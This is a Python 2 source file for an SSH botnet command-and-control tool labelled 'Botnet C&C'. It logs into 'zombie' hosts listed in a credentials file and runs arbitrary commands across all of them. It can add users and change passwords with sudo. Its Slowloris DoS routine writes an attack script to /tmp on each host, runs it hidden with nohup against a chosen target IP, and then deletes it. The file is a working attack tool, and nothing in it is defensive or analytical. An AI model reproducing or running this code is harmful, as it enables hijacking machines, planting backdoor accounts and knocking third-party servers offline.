import paramiko
import sys


def init_text():
	print "    ____          __                __     ______ ___     ______\n   / __ ) ____   / /_ ____   ___   / /_   / ____/( _ )   / ____/\n  / __  |/ __ \ / __// __ \ / _ \ / __/  / /    / __ \/|/ /\n / /_/ // /_/ // /_ / / / //  __// /_   / /___ / /_/  </ /__\n/_____/ \____/ \__//_/ /_/ \___/ \__/   \____/ \____/\/\____/\n" 
	print "1: Zombie list"
	print "2: Heartbeat"
	print "3: Add user"
	print "4: Change user password"
	print "5: Slowloris DoS attack"
	print "6: Specific command"
	return raw_input("\nOption: ")


def list_zombies(users):
	for u in users:
		if len(u)>3:
			try:
				print "-",u.split("-")[0]
			except:
				print "Error"


def dos_attack(users,attacked_ip):
	py_file="/tmp/temp.py"
	sh_file="/tmp/script.sh"
	timeout="120"
	sockets="40"
	cmd_remove_python_proc = "killall python"
	cmd_create_file1  = """echo -e 'import socket, random, time, sys\nheaders = [ "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Accept-language: en-US,en"]\nsockets = []\ndef setupSocket(ip):\n sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n sock.settimeout(4)\n sock.connect((ip, 80))\n sock.send("GET /?{} HTTP/1.1\\\\r\\\\n".format(random.randint(0, 1337)).encode("utf-8"))\n for header in headers:\n  sock.send("{}\\\\r\\\\n".format(header).encode("utf-8"))\n return sock\nif __name__ == "__main__":\n ip = sys.argv[1]\n count = """+sockets+"""\n for _ in range(count):\n  try:\n   sock = setupSocket(ip)\n  except socket.error:\n   break\n  sockets.append(sock)\n while True:\n  for sock in list(sockets):\n   try:\n    sock.send("X-a: {}\\\\r\\\\n".format(random.randint(1, 4600)).encode("utf-8"))\n   except socket.error:\n    sockets.remove(sock)\n  for _ in range(count - len(sockets)):\n   try:\n    sock = setupSocket(ip)\n    if sock:\n     sockets.append(sock)\n   except socket.error:\n    break\n  time.sleep(15)\n' > """+py_file
	cmd_execute_file1 = "nohup python "+py_file+" "+attacked_ip+" >/dev/null 2>&1 &"
	cmd_create_file2  = """echo -e '#!/sh\nsleep """+timeout+"""\nkillall python\nrm """+py_file+"""\nrm """+sh_file+"""' > """+sh_file+""""""
	cmd_execute_file2 = "nohup sh "+sh_file+" >/dev/null 2>&1 &"
	for u in users:
		if len(u)>2:
			try:
				ip_,uname_,pwd_=u.split("-")
				try:
					exec_cmd(ip_,uname_,pwd_,cmd_remove_python_proc,log=False)
					exec_cmd(ip_,uname_,pwd_,cmd_create_file1,log=False)
					exec_cmd(ip_,uname_,pwd_,cmd_create_file2,log=False)
					exec_cmd(ip_,uname_,pwd_,cmd_execute_file1,log=False)
					exec_cmd(ip_,uname_,pwd_,cmd_execute_file2,log=False)
				except:
					print "Error contacting IP "+ip_
			except:
				print "Error reading "+u
				pass


def heartbeat(users,user_ip):
	cmd_="ping "+user_ip+" -c 1"
	specific_cmd(users, cmd_)
	'''
	for u in users:
		if len(u)>2:
			try:
				ip_,uname_,pwd_=u.split("-")
				exec_cmd(ip_,uname_,pwd_,cmd_)
			except:
				print "Error"
	'''

def add_user(users,username):
	cmd_="sudo -S useradd "+username+" "
	specific_cmd(users, cmd_)


def change_pwd(users,username,password):
	for u in users:
		if len(u)>2:
			try:
				ip_,uname_,pwd_=u.split("-")
				cmd_='echo -e "'+pwd_+'\n'+username+':'+password+'" | sudo -S chpasswd'
				exec_cmd(ip_,uname_,pwd_,cmd_)
			except:
				print "Error"


def specific_cmd(users, cmd_):
	for u in users:
		if len(u)>2:
			try:
				ip_,uname_,pwd_=u.split("-")
				exec_cmd(ip_,uname_,pwd_,cmd_)
			except:
				print "Error"


def exec_cmd(ip_,uname_,pwd_,cmd_,log=True):
	client = paramiko.SSHClient()
	client.load_system_host_keys()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.connect(ip_, username=uname_, password=pwd_)
	stdin, stdout, stderr = client.exec_command(cmd_)
	stdin.write(pwd_+'\n')
	stdin.flush()
	if log is True:
		print "\nOutput from %s: " %(ip_)
		for line in stdout:
			print(line.replace("\n",""))
		for line in stderr:
			print(line.replace("\n",""))
		print "--------------------------------------------"
	client.close()


def main():
	option = init_text()
	users=open("ssh_users.txt","r").read().splitlines()
	if option == "1":
		list_zombies(users)
	elif option == "2":
		user_ip=raw_input("Your IP:")
		heartbeat(users,user_ip)
	elif option == "3":
		username=raw_input("Username:")
		add_user(users,username)
	elif option == "4":
		username=raw_input("Username:")
		password=raw_input("Password:")
		change_pwd(users,username,password)
	elif option == "5":
		attacked_ip=raw_input("Attack ip:")
		dos_attack(users,attacked_ip)
	elif option == "6":
		if len(sys.argv) >=2:
			cmd_=sys.argv[1]
			print "Command:",cmd_
		else:
			cmd_=raw_input("Command: ")
		specific_cmd(users,cmd_)



if __name__ == "__main__":
    main()
#Author: ricardojoserf
